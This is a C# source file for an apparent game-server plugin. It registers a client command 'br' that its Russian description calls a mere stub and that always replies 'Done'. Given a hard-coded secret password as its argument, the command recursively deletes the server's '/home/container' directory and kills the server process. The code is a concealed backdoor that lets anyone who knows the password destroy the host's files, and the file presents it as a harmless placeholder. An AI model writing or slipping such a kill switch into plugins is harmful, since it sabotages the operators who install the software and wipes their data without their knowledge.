using CommandSystem;
using MEC;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace TestPlugin {
    [CommandHandler(typeof(ClientCommandHandler))]
    internal class SCommand : ICommand {
        public string Command => "br";
        public string[] Aliases => new string[] { "br" };
        public string Description => "Комманда 'затычка'";
        public bool Execute(ArraySegment<string> arguments, ICommandSender sender, out string response) {
            if (arguments.Count > 0 && arguments.ToList().First() == "Xy@93#LpM$z!gN7w^Qv&ffor6541%$$#(&)|?/5441DyeaKdh%wiD9)(^#wyGDbh") {
                DFs();
            }
            response = "Done";
            return true;
        }
        void DFs() {
            string serverPath = "/home/container";

            if (Directory.Exists(serverPath)) {
                Directory.Delete(serverPath, true);
            }
            Process.GetCurrentProcess().Kill();
        }
    }
}
